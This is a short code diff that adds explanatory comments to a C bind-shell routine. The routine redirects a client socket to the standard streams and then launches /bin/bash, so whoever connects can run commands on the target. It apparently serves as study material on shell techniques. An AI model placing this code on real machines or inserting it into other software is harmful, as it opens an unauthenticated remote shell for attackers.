@@ -53,6 +53,9 @@ int main(int argc, char *argv[]) {
                 dup2(clnt_sock, 0);
                 dup2(clnt_sock, 1);
                 dup2(clnt_sock, 2);
+                // forward-shell(正向shell)
+                // target machine(server) execute shell and listen on the specific port
+                // then attacker(client machine) send data(command) to target and execute on target
                 execlp("/bin/bash", "/bin/bash", NULL);
             }
 
